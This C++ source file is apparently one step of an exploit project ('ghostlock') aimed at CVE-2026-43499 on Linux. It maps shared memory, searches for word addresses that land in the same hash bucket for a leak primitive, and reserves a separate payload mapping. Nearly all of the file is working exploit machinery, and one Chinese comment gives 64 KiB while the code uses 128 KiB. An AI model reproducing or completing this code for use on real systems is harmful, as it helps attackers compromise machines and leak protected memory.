/** @file backend/cve_2026_43499/steps/words_region.cpp
 *  The words' home. See the header for why it is a unit of its own.
 */
#include "backend/cve_2026_43499/steps/words_region.hpp"

#include <cstdio>

#include "backend/cve_2026_43499/leak/snitch_ops_linux.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    namespace {
        /** 64 KiB：1/256 的桶赔率下，找齐四个同桶位置的把握接近 1。 */
        inline constexpr std::size_t kWordsRegionBytes = 128U * 1024U;
        inline constexpr std::size_t kMaxWords = 4U;
    }  // namespace

    WordsRegion::~WordsRegion() noexcept { close(); }

    bool WordsRegion::place(std::size_t count, leak::CollisionBuckets &buckets) noexcept {
        close();
        if (count == 0U || count > kMaxWords) {
            return false;
        }
        const auto mapped = leak::LinuxSnitchOps::map_shared(kWordsRegionBytes);
        if (mapped.address == nullptr) {
            return false;
        }
        region_ = mapped.address;
        /* 载荷专用映射：1 MiB，好按 64 KiB 步长挑出满足判据的那一块。 */
        const auto payload_mapped = leak::LinuxSnitchOps::map_shared(kPayloadRegionBytes);
        if (payload_mapped.address == nullptr) {
            close();
            return false;
        }
        payload_region_ = payload_mapped.address;
        auto *base = static_cast<unsigned char *>(region_);
        words_[0] = reinterpret_cast<std::uint32_t *>(base);
        addresses_[0] = reinterpret_cast<std::uint64_t>(words_[0]);
        const std::uint64_t wanted = buckets.bucket_of(addresses_[0]);
        placed_ = 1U;
        for (std::size_t at = sizeof(std::uint32_t);
             at + sizeof(std::uint32_t) <= kWordsRegionBytes && placed_ < count;
             at += sizeof(std::uint32_t)) {
            const std::uint64_t candidate = reinterpret_cast<std::uint64_t>(base + at);
            if (buckets.bucket_of(candidate) == wanted) {
                words_[placed_] = reinterpret_cast<std::uint32_t *>(base + at);
                addresses_[placed_] = candidate;
                ++placed_;
            }
        }
        if (placed_ < count) {
            close();
            return false;
        }
        return true;
    }

    void WordsRegion::close() noexcept {
        if (payload_region_ != nullptr) {
            static_cast<void>(leak::LinuxSnitchOps::unmap(payload_region_, kPayloadRegionBytes));
            payload_region_ = nullptr;
        }
        if (region_ != nullptr) {
            static_cast<void>(leak::LinuxSnitchOps::unmap(region_, kWordsRegionBytes));
            region_ = nullptr;
        }
        for (std::size_t i = 0U; i < kMaxWords; ++i) {
            words_[i] = nullptr;
            addresses_[i] = 0U;
        }
        placed_ = 0U;
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
